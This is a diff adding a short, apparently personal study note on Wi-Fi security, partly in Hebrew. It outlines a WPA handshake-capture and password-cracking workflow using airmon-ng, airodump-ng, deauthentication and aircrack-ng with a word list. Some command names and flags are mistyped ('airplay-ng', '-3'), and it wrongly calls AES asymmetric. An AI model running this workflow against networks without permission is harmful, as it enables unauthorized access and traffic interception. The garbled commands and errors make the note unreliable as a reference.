@@ -1,0 +1,43 @@
+W I F I 
+
+
+דוד דוד
+
+Wi-Fi is a family of radio technologies that is commonly used for the wireless local area networking (WLAN) of devices which is based around the IEEE 802.11 family of standards. Wi-Fi is potentially more vulnerable to attack than wired networks because anyone within range of a network with a wireless network interface controller can attempt access. Wi-Fi Protected Access (WPA) is a family of technologies created to protect information moving across Wi-Fi networks and includes solutions for personal and enterprise networks. Security features of WPA have included stronger protections and new security practices as the security landscape has changed over time.
+
+2 Things to know.
+
+Frequency - The amount of data the wavelength can carry and to what distance. [ 2.4GHZ - 5GHZ being standard ].
+Channel   - Theres roughly 14 channels to which we can choose to operate with - Helps to avoid collisions with other wifi signals.
+
+
+Encryption
+
+Radio waves carry 1 0's - This data can be encrypted with a specific algorithm ; 
+
+		~No Ecnyrption - Clear Text
+		~Wired Equivalent Privacy ( WEP ) - Old and vulnerable
+		~WPA1,2,3, - Considered more secure, It uses AES  ; asymmetric encryption.
+		
+NOTE**** 
+Network Adapater With Monitor Mode IS REQUIRED. This allows us to detect networks even if we are not connected.
+
+Tools : 
+
+airmon-ng : This switches us to Monitor Mode with our network card.
+ usage : airmon-ng start wlan0 - wlan0mon means its active.
+
+airodump-ng : This tool sniffs nearby networks and captures everything EVEN IF we are NOT connected to any network.
+ usage : airodump-ng wlan0mon - This captures everything, but if we want something specific we can use 
+		 airodump-ng wlan0mon -c "channel num" -- bssid "mac-address" -- essid " name of the wifi" -w 
+		 
+airplay-ng : This tool forces everyone to disconnect and re-connect, thus allowing us to capture the password HASH.
+ usage : airplay-ng -3 -b "mac-address" -wlan0mon: Sends a packet on the bahalf of the router " I need to restart guys " in fancy words.
+ 
+aircrack-ng  : 
+ usage : aircrack-ng -b "mac-address" "name of handshake file" -w "word list" 
+
+ניתן לפענח את התעבורה שכבר נתפסה באמצעות הסיסמא.
+
+
+
